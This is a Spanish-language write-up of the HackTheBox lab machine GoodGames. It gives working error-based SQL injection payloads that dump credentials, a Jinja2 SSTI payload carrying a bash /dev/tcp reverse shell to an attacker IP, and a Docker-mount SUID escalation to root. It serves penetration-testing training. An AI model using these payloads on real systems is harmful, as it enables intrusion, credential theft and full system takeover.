---
title: GoodGames
description: "Máquina GoodGames de Hackthebox"
date: 2024-08-06 23:50:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Hackthebox
  - Linux
tags:
  - SSTI (Server Side Template Injection)
  - Docker Breakout
  - SQLI (Error Based)
  - Hash Cracking Weak Algorithms
  - Password Reuse
image:
  path: /assets/img/GoodGames/GoodGames.png
---

## Skills

- SSTI (Server Side Template Injection)
- Docker Breakout (Privilege Escalation) [PIVOTING]
- SQLI (Error Based)
- Hash Cracking Weak Algorithms
- Password Reuse

## Certificaciones

- OSCP (Escalada)
- eWPT
- eJPT
- eCPPTv3

## Descripción

`GoodGames` es una máquina `easy linux`, `obtenemos` unas `credenciales` del usuario `admin` a través de una `SQL Injection Error Based`. Una vez logueamos ejecutamos un `SSTI (Server Side Template Injection)` mediante el cual obtenemos un `RCE (Remote Command Execution)` mediante el cual `ganamos acceso` a un `contenedor`. `Escapamos` del `contenedor` y nos `convertimos` en usuario `root`, debido a que un `directorio` de la `máquina víctima` estaba `montado` en el `contenedor`, lo cual nos permitiría `convertirnos` en `root` agregando privilegios `SUID` a la `sh`

---

## Reconocimiento

Se comprueba que la `máquina` está `activa` y se determina su `sistema operativo`, el `ttl` de las máquinas `linux` suele ser `64`, en este caso hay un nodo intermediario que hace que el ttl disminuya en una unidad

```
# ping 10.129.183.190
PING 10.129.183.190 (10.129.183.190) 56(84) bytes of data.
64 bytes from 10.129.183.190: icmp_seq=1 ttl=63 time=57.3 ms
64 bytes from 10.129.183.190: icmp_seq=2 ttl=63 time=60.0 ms
^C
--- 10.129.183.190 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 57.277/58.624/59.972/1.347 ms
```

### Nmap

Se va a realizar un escaneo de todos los `puertos` abiertos en el protocolo `TCP` a través de `nmap`

```
# sudo nmap -p- --open --min-rate 5000 -sS -Pn -n 10.129.183.190 -v -oG openPorts
[sudo] password for justice-reaper: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-07 01:29 CEST
Initiating SYN Stealth Scan at 01:29
Scanning 10.129.183.190 [65535 ports]
Discovered open port 80/tcp on 10.129.183.190
Completed SYN Stealth Scan at 01:30, 13.54s elapsed (65535 total ports)
Nmap scan report for 10.129.183.190
Host is up (0.13s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.64 seconds
           Raw packets sent: 66267 (2.916MB) | Rcvd: 66267 (2.651MB)
```

Se procede a realizar un análisis de `detección` de `servicios` y la `identificación` de `versiones` utilizando los puertos abiertos encontrados

```
# nmap -sCV -p80 10.129.183.190 -oN services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-07 01:31 CEST
Nmap scan report for 10.129.183.190
Host is up (0.067s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.51
|_http-title: GoodGames | Community and Store
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
Service Info: Host: goodgames.htb

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.13 seconds
```

### Web Enumeration

Cuando accedemos al `servicio web` vemos esto

![](/assets/img/GoodGames/image_1.png)

Si pulsamos arriba a la derecha nos sale este `panel` de `login`

![](/assets/img/GoodGames/image_2.png)

## Web Exploitation

He `capturado` la `petición` con `Burpsuite` y he efectuado un `SQLI (Sql Injection)`

![](/assets/img/GoodGames/image_3.png)

Una vez `logueados` nos lleva hasta aquí

![](/assets/img/GoodGames/image_4.png)

Mediante `Wappalyzer` vemos que está corriendo `Flask` por lo tanto podríamos intentar `modificar` los `datos` del `perfil` y efectuar un `SSTI (Server Side Template Injection)`

![](/assets/img/GoodGames/image_5.png)

Si `pinchamos` arriba a la derecha en el `símbolo` de la `rueda` nos lleva a la siguiente página, lo cual indica que hay `Virtual Hosting`

![](/assets/img/GoodGames/image_6.png)

`Añadimos` el `dominio` y el `subdominio` al `/etc/hosts`

```
127.0.0.1       localhost
127.0.1.1       Kali-Linux
10.129.183.190  goodgames.htb internal-administration.goodgames.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Si accedemos de nuevo veremos esto

![](/assets/img/GoodGames/image_7.png)

Como no tenemos la `contraseña` del usuario `administrador` no podemos acceder, sin embargo, a través de la `SQLI` vamos a `obtener` las `credenciales`. Lo primero que debemos hacer es `capturar` la `petición` con el `Burpsuite` y `listar` el `número` de `columnas`, esto se puede hacer con un `order by`, si usamos `order by 5` nos da un `error` y si hacemos un `order by 4` no, lo que significa que es un `SQLI Error Based` y que tiene `4 columnas `

![](/assets/img/GoodGames/image_8.png)

```
email=test%40gmail.com' order by 4-- - &password=test
```

`Listamos` todas las `bases` de `datos`

![](/assets/img/GoodGames/image_9.png)

```
email=test%40gmail.com' union select 1,2,3,group_concat(schema_name) from information_schema.schemata-- - &password=test
```

`Listamos` las `tablas` de la base de datos `Main`

![](/assets/img/GoodGames/image_10.png)

```
email=test%40gmail.com' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema='main'-- - &password=test
```

`Listamos` las `columnas` de la tabla `User`

![](/assets/img/GoodGames/image_11.png)

```
email=test%40gmail.com' union select 1,2,3,group_concat(column_name) FROM information_schema.columns WHERE table_name='user' AND table_schema='main'-- - &password=test
```

`Listamos` el `contenido` de la tabla `User`

![](/assets/img/GoodGames/image_12.png)

```
email=test%40gmail.com' union select 1,2,3,group_concat(name, ' : ',email,' : ',password ) from user-- -  &password=test
```

He `obtenido` la contraseña (`2b22337f218b2d82dfc3b6f77e7cb8ec`) del usuario `admin` usando `rainbow tables` [https://hashes.com/en/decrypt/hash](https://hashes.com/en/decrypt/hash)

![](/assets/img/GoodGames/image_13.png)

Como ya tenemos la `contraseña` del usuario `admin` ya podemos acceder a `http://internal-administration.goodgames.htb/login`

![](/assets/img/GoodGames/image_14.png)

Ya estamos dentro del `panel administrativo`

![](/assets/img/GoodGames/image_15.png)

Pinchamos en `My Profile` y usamos el payload {% raw %} `{{ 7*7 }}` {% endraw %} para testear el `SSTI (Server Side Template Injection)`

![](/assets/img/GoodGames/image_16.png)

La `web` es `vulnerable` a `SSTI`

![](/assets/img/GoodGames/image_17.png)

En `PayloadsAllTheThings` [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2) hay muchos `payloads` para `explotar` un `SSTI`. En mi caso voy a usar este para `ejecutar comandos`

![](/assets/img/GoodGames/image_18.png)

{% raw %}
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
{% endraw %}

## Intrusión

Vamos a mandarnos una `reverse shell` a nuestro equipo para ganar acceso a la máquina víctima, para ello nos ponemos en escucha con `netcat` por el `puerto 9993`

```
# nc -nlvp 9993
```

`Inyectamos` este `payload` en el campo `Full Name`

{% raw %}
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/10.10.16.35/9993 0>&1"').read() }}
```
{% endraw %}

`Ganamos acceso` a la máquina víctima como usuario `root`

```
# nc -nlvp 9993
listening on [any] 9993 ...
connect to [10.10.16.35] from (UNKNOWN) [10.129.183.190] 49396
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@3a453ab39d3d:/backend# whoami
whoami
root
```

## Privilege Escalation

Sin embargo nos encontramos dentro de un `contenedor`

```
root@3a453ab39d3d:/backend# hostname -i
hostname -i
172.19.0.2
```

Descubrimos los `puertos abiertos` de la máquina principal

```
root@3a453ab39d3d:/home# for i in {1..65535}; do (echo > /dev/tcp/172.19.0.1/$i) >/dev/null 2>&1 && echo $i is open; done
```

Vemos que `/home/agustus` es una `montura` de la máquina principal a la cual tenemos acceso

```
root@3a453ab39d3d:/home# mount
overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/BMOEKLXDA4EFIXZ4O4AP7LYEVQ:/var/lib/docker/overlay2/l/E365MWZN2IXKTIAKIBBWWUOADT:/var/lib/docker/overlay2/l/ZN44ERHF3TPZW7GPHTZDOBQAD5:/var/lib/docker/overlay2/l/BMI22QFRJIUAWSWNAECLQ35DQS:/var/lib/docker/overlay2/l/6KXJS2GP5OWZY2WMA64DMEN37D:/var/lib/docker/overlay2/l/FE6JM56VMBUSHKLHKZN4M7BBF7:/var/lib/docker/overlay2/l/MSWSF5XCNMHEUPP5YFFRZSUOOO:/var/lib/docker/overlay2/l/3VLCE4GRHDQSBFCRABM7ZL2II6:/var/lib/docker/overlay2/l/G4RUINBGG77H7HZT5VA3U3QNM3:/var/lib/docker/overlay2/l/3UIIMRKYCPEGS4LCPXEJLYRETY:/var/lib/docker/overlay2/l/U54SKFNVA3CXQLYRADDSJ7NRPN:/var/lib/docker/overlay2/l/UIMFGMQODUTR2562B2YJIOUNHL:/var/lib/docker/overlay2/l/HEPVGMWCYIV7JX7KCI6WZ4QYV5,upperdir=/var/lib/docker/overlay2/4bc2f5ca1b7adeaec264b5690fbc99dfe8c555f7bc8c9ac661cef6a99e859623/diff,workdir=/var/lib/docker/overlay2/4bc2f5ca1b7adeaec264b5690fbc99dfe8c555f7bc8c9ac661cef6a99e859623/work)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
sysfs on /sys type sysfs (ro,nosuid,nodev,noexec,relatime)
tmpfs on /sys/fs/cgroup type tmpfs (rw,nosuid,nodev,noexec,relatime,mode=755)
cgroup on /sys/fs/cgroup/systemd type cgroup (ro,nosuid,nodev,noexec,relatime,xattr,name=systemd)
cgroup on /sys/fs/cgroup/rdma type cgroup (ro,nosuid,nodev,noexec,relatime,rdma)
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (ro,nosuid,nodev,noexec,relatime,net_cls,net_prio)
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (ro,nosuid,nodev,noexec,relatime,cpu,cpuacct)
cgroup on /sys/fs/cgroup/pids type cgroup (ro,nosuid,nodev,noexec,relatime,pids)
cgroup on /sys/fs/cgroup/freezer type cgroup (ro,nosuid,nodev,noexec,relatime,freezer)
cgroup on /sys/fs/cgroup/perf_event type cgroup (ro,nosuid,nodev,noexec,relatime,perf_event)
cgroup on /sys/fs/cgroup/cpuset type cgroup (ro,nosuid,nodev,noexec,relatime,cpuset)
cgroup on /sys/fs/cgroup/memory type cgroup (ro,nosuid,nodev,noexec,relatime,memory)
cgroup on /sys/fs/cgroup/devices type cgroup (ro,nosuid,nodev,noexec,relatime,devices)
cgroup on /sys/fs/cgroup/blkio type cgroup (ro,nosuid,nodev,noexec,relatime,blkio)
mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
/dev/sda1 on /home/augustus type ext4 (rw,relatime,errors=remount-ro)
/dev/sda1 on /etc/resolv.conf type ext4 (rw,relatime,errors=remount-ro)
/dev/sda1 on /etc/hostname type ext4 (rw,relatime,errors=remount-ro)
/dev/sda1 on /etc/hosts type ext4 (rw,relatime,errors=remount-ro)
shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k)
proc on /proc/bus type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/fs type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/irq type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/sys type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/sysrq-trigger type proc (ro,nosuid,nodev,noexec,relatime)
tmpfs on /proc/acpi type tmpfs (ro,relatime)
tmpfs on /proc/kcore type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/keys type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/timer_list type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/sched_debug type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /sys/firmware type tmpfs (ro,relatime)
```

Como tenemos `acceso` a un `directorio` que está en la `montura`, podemos añadir la `sh` a este directorio y darle permisos `SUID`, para que cuando nos conectemos como el usuario `augustus` a la máquina principal `convertirnos` en `root`

```
root@3a453ab39d3d:/home/augustus# cp /bin/sh .
root@3a453ab39d3d:/home/augustus# chmod u+s sh 
root@3a453ab39d3d:/home/augustus# ls -l sh
-rwsr-xr-x 1 root root 1099016 Aug  7 01:03 sh
```

Nos conectamos a la máquina principal como el usuario `augustus` por `SSH` usando la contraseña `superadministrator`

```
root@3a453ab39d3d:/home# ssh augustus@172.19.0.1
augustus@172.19.0.1's password: 
Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
augustus@GoodGames:~$ whoami
augustus
augustus@GoodGames:~$ ls -l
total 1196
-rwsr-xr-x 1 root root      117208 Aug  7 02:08 sh
-rw-r----- 1 root augustus      33 Aug  7 00:27 user.txt
augustus@GoodGames:~$ ./sh
# whoami
root
```
